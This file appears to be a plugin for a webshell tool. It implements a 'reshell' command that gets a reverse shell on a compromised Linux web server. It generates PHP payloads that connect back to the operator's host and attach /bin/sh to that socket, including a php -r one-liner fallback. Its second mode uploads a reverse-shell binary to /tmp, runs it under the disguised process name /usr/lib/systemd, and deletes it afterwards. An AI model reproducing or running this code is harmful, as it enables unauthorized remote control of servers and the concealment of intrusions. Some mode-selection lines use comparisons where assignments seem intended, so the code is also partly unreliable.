from os import path
from threading import Thread

from libs.c64 import encrypt
from libs.config import alias, gget, color
from libs.myapp import delay_send, get_system_code, has_env, is_windows, send
from libs.reverse_client_bash import main as bind
from webshell_plugins.upload import run as upload


def get_php(ip, port):
    return f"""$sock = fsockopen("{ip}", {port});
$descriptorspec = array(
0 => $sock,
1 => $sock,
2 => $sock
);
$process = proc_open('/bin/sh', $descriptorspec, $pipes);
proc_close($process);
"""


@alias(True, func_alias="rs", l="lhost", p="port", m="mode", f="fakename")
def run(lhost: str, port: int, mode: int = 0, fakename: str = "/usr/lib/systemd"):
    """
    reshell

    Bind a local port and wait for target connect back to get a full shell.

    eg: reshell {lhost} {port} {type=[python|upload]{1|2},default = 0 (Python:1 Not Python:2)} {(Only for Mode 2) fakename=/usr/lib/systemd}
    """
    if (is_windows(False) or is_windows()):
        print(color.red(f"\nOnly for both system is linux\n"))
        return False
    try:
        port = int(port)
    except ValueError:
        port = 23333
    disable_func_list = gget("webshell.disable_functions", "webshell")
    MODE = 1
    print(color.yellow(f"Waring: You are using a testing command...."))
    print(color.yellow(f"        Please make sure Port {port} open...."))
    if (mode == 0):
        if (has_env("python")):
            print(color.green(f"\nTraget has python environment"))
            MODE == 1
        else:
            print(color.red(f"\nTraget has not python environment"))
            MODE == 2
    else:
        MODE = int(mode)

    if (MODE == 1):
        print(color.yellow(f"\nUse Mode 1->python"))
        if ("proc_open" in disable_func_list):
            print(color.yellow(f"\nproc_open is disabled... Try use php command"))
            command = get_system_code(f"""php -n -r '$sock=fsockopen("{lhost}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'""")
            if ("No system execute function" in command):
                print(color.red(f"No system execute function\n"))
        else:
            command = get_php(lhost, port)
    else:
        print(color.yellow(f"\nUse Mode 2->upload"))
        filename = encrypt(f"{lhost}-{port}")
        if not upload(path.join(gget("root_path"), "auxiliary", "reshell", "reverse_server_x86_64"), "/tmp/%s" % filename, True):
            return
        command = get_system_code(f"cd /tmp && chmod +x {filename} && ./{filename} {fakename}", False)
    t = Thread(target=delay_send, args=(2, command))
    t.setDaemon(True)
    t.start()
    print(f"\nBind port {color.yellow(str(port))}...")
    if (not bind(port, MODE)):
        print(color.red("\nBind port error\n"))
    if (MODE == 2):
        res = send(f"unlink('/tmp/{filename}');")
        if (not res):
            return
